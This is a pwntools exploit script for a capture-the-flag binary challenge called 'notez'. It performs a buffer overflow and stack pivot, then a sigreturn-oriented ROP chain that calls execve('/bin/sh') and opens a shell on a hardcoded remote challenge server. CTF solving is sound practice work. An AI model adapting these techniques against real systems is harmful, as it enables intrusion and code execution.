#!/usr/bin/env python3

from pwn import *

PATH = "/home/kali/CTFs/Events/QnQ-2025/pwn/notez/notez" 

exe = context.binary = ELF(PATH, checksec=False)

if args.REMOTE:
    HOST = "161.97.155.116"
    PORT = 14337
    p = remote(HOST, PORT)
else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
b *0x40129F
b *0x4012CC
b *0x401283
c
"""
        gdb.attach(p, gdbscript=GDB_SCRIPT)


buf_glob = 0x404070
PADDING_LEN = cyclic_find(0x6161616161616166, n=8)

payload = b''
payload += b'\x00' * (PADDING_LEN - len(payload) - 0x08) # Padding
payload += p64(buf_glob + 0x04 + 0x20)  # future RBP: so [RBP - 0x04] falls into an addr which contains big enough value for next read
payload += p64(0x401231)                # addr for next read

p.send(payload)

rop = ROP(exe)

bin_sh_addr = buf_glob + 0x04           # Got it from GDB
print(f'/bin/sh: {hex(bin_sh_addr)}')

# stores b'/bin/sh' and sets up first rop chain
payload = b'/bin/sh\x00'
payload += p64(0) * 3               # padding
payload += p64(0x200)               # set size for future memcpy
payload += p64(rop.rax.address)
payload += p64(0x0F)                # set RAX = 0x0F for sigreturn syscall
payload += p64(rop.syscall.address) # jump to syscall

# Allows us to return to execve("/bin/sh")
frame = SigreturnFrame()
frame.rax = 0x3b                # execve syscall number
frame.rdi = bin_sh_addr         # address of /bin/sh string
frame.rip = rop.syscall.address # jumping to syscall gadget
frame.rdx = 0                   # set argv to NULL
frame.rsi = 0                   # set envp to NULL

payload += bytes(frame)

print(f'Generating sigreturnFrame of size {hex(len(frame))}...')

p.send(payload)

p.interactive()